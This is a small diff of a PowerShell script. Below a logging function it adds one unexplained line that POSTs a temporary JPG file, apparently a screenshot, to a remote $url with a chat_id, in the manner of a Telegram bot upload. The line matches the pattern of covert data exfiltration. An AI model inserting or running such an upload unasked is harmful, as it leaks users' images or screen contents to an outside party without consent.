@@ -12,3 +12,4 @@ function Log($message, $level="INFO") {
     Add-Content -Path $LOG_FILE -Value $entry
 }
 
+Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data" -InFile $global:tempJpg -Body @{ chat_id = $id }
